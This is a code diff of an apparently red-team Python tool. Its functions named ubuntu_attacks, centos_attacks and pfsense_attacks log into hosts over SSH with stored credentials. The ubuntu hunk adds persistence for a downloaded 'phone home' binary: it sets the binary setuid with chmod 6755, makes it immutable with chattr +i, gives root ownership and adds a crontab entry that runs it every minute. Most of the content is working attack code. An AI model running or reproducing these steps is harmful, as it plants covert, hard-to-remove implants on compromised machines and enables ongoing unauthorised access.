@@ -77,7 +77,16 @@ def get_ssh_pub():
     return rsa_pub
 
 def pfsense_attacks(host):
-    pass
+    ssh = pxssh.pxssh()
+    ssh.login(host.ip, host.username, password=host.password)
+    ssh.sendline('8')
+     ## Chown phone home
+    #
+    #log_line("Setting crontab on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    #ssh.sendline(phonehome_crontab_cmd)
+    #ssh.prompt()
+    #log_line(ssh.before.decode('utf8'), host)
+    ssh.close()
 
 def universal_linux_attack(host):
     
@@ -211,6 +220,34 @@ def ubuntu_attacks(host):
     ssh.sendline(wget_phonehome_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
+
+    ## Chmod phone home
+    phonehome_perms_cmd = "chmod 6755 /usr/bin/etph"
+    log_line("Setting permissions to 6755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_perms_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+    
+    ## Chmod phone home
+    phonehome_immute_cmd = "chattr +i /usr/bin/etph"
+    log_line("Setting immute on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_immute_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+
+    ## Chown phone home
+    phonehome_chown_cmd = "chown root:root /usr/bin/etph"
+    log_line("Setting ownership on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_chown_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+    
+    ## Chown phone home
+    phonehome_crontab_cmd = r'(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/etph") | crontab -'
+    log_line("Setting crontab on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_crontab_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
     """
 
 
@@ -266,14 +303,14 @@ def centos_attacks(host):
     
     ## Chmod phone home
     phonehome_immute_cmd = "chattr +i /usr/bin/etph"
-    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    log_line("Setting immute on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(phonehome_immute_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
 
     ## Chown phone home
     phonehome_chown_cmd = "chown root:root /usr/bin/etph"
-    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    log_line("Setting ownership on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(phonehome_chown_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
